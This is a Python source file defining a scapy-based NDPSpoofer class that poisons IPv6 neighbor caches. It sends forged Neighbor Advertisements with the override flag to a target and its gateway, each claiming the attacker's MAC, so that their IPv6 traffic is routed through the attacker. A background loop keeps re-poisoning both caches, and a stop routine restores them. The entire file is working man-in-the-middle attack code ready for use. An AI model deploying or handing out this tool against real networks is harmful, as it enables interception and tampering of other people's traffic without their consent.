import logging
import threading
import time
from scapy.all import *
from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6ND_NS, ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr
from scapy.layers.l2 import Ether

logger = logging.getLogger('NDPSpoofer')


class NDPSpoofer:
    """
    NDP cause ipv6
    """

    def __init__(self, interface, target_ipv6, gateway_ipv6, packet_handler=None):
        self.interface = interface
        self.target_ipv6 = target_ipv6
        self.gateway_ipv6 = gateway_ipv6
        self.packet_handler = packet_handler
        self.running = False
        self.spoof_thread = None

        self.attacker_mac = get_if_hwaddr(interface)
        logger.info(f"Our MAC address: {self.attacker_mac}")

        self.target_mac = self._get_mac_ndp(target_ipv6)
        self.gateway_mac = self._get_mac_ndp(gateway_ipv6)

        if not self.target_mac:
            logger.error(f"Could not get MAC address for target {target_ipv6}")
            raise ValueError(f"Target {target_ipv6} not found on network")
        else:
            logger.info(f"Target MAC: {self.target_mac}")

        if not self.gateway_mac:
            logger.error(
                f"Could not get MAC address for gateway {gateway_ipv6}")
            raise ValueError(f"Gateway {gateway_ipv6} not found on network")
        else:
            logger.info(f"Gateway MAC: {self.gateway_mac}")

    def _get_mac_ndp(self, ipv6):
        """Get MAC address for an IPv6 address using NDP"""
        try:
            # Create Neighbor Solicitation
            ns = IPv6(dst=ipv6) / ICMPv6ND_NS(tgt=ipv6)

            # Send and wait for Neighbor Advertisement
            response = sr1(ns, iface=self.interface, timeout=2, verbose=0)

            if response and response.haslayer(ICMPv6ND_NA):
                if response.haslayer(ICMPv6NDOptDstLLAddr):
                    return response[ICMPv6NDOptDstLLAddr].lladdr
                elif response.haslayer(ICMPv6NDOptSrcLLAddr):
                    return response[ICMPv6NDOptSrcLLAddr].lladdr

                # Sometimes MAC is in ether layer
                if response.haslayer(Ether):
                    return response[Ether].src

            return None
        except Exception as e:
            logger.error(f"Error getting MAC for {ipv6}: {e}")
            return None

    def _spoof(self):
        """Send NDP poison packets to target and gateway"""

        # Create poisoned Neighbor Advertisement for target
        # This tells the target that WE have the gateway's IPv6 address
        target_poison = Ether(dst=self.target_mac) / \
            IPv6(dst=self.target_ipv6) / \
            ICMPv6ND_NA(
            tgt=self.gateway_ipv6,  # WE claim to be the gateway
            R=1,  # Router flag
            S=1,  # Solicited flag
            O=1   # Override flag
        ) / \
            ICMPv6NDOptDstLLAddr(lladdr=self.attacker_mac)  # OUR MAC

        # Create poisoned Neighbor Advertisement for gateway
        # This tells the gateway that WE have the target's IPv6 address
        gateway_poison = Ether(dst=self.gateway_mac) / \
            IPv6(dst=self.gateway_ipv6) / \
            ICMPv6ND_NA(
            tgt=self.target_ipv6,  # WE claim to be the target
            R=0,  # Not a router
            S=1,  # Solicited flag
            O=1   # Override flag
        ) / \
            ICMPv6NDOptDstLLAddr(lladdr=self.attacker_mac)  # OUR MAC

        sendp(target_poison, verbose=0, iface=self.interface)
        sendp(gateway_poison, verbose=0, iface=self.interface)

        logger.debug(f"Sent NDP poison packets")

    def _restore_ndp(self):
        """Restore normal NDP tables on target and gateway"""

        logger.info("Restoring NDP tables...")

        # Tell target the real MAC address of gateway
        target_restore = Ether(dst=self.target_mac) / \
            IPv6(dst=self.target_ipv6) / \
            ICMPv6ND_NA(
            tgt=self.gateway_ipv6,
            R=1,
            S=1,
            O=1
        ) / \
            ICMPv6NDOptDstLLAddr(lladdr=self.gateway_mac)  # Real gateway MAC

        # Tell gateway the real MAC address of target
        gateway_restore = Ether(dst=self.gateway_mac) / \
            IPv6(dst=self.gateway_ipv6) / \
            ICMPv6ND_NA(
            tgt=self.target_ipv6,
            R=0,
            S=1,
            O=1
        ) / \
            ICMPv6NDOptDstLLAddr(lladdr=self.target_mac)  # Real target MAC

        # Send restore packets multiple times just in case
        for _ in range(10):
            sendp(target_restore, verbose=0, iface=self.interface, count=2)
            sendp(gateway_restore, verbose=0, iface=self.interface, count=2)
            time.sleep(0.5)

        logger.info("NDP tables restored")

    def _spoof_loop(self):
        """Main spoofing loop that runs in a thread"""
        try:
            while self.running:
                self._spoof()
                time.sleep(2)
        except Exception as e:
            logger.error(f"Error in NDP spoofing loop: {e}")
            self.running = False

    def start(self):
        if not self.target_mac or not self.gateway_mac:
            logger.error("Cannot start NDP spoofing without MAC addresses")
            return False

        self.running = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop)
        self.spoof_thread.daemon = True
        self.spoof_thread.start()

        logger.info(
            f"NDP spoofing started: {self.target_ipv6} <-> {self.gateway_ipv6}")
        logger.info(
            f"All IPv6 traffic between {self.target_ipv6} and {self.gateway_ipv6} will now pass through us")
        return True

    def stop(self):
        logger.info("Stopping NDP spoofing...")
        self.running = False

        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)

        self._restore_ndp()
        logger.info("NDP spoofing stopped")
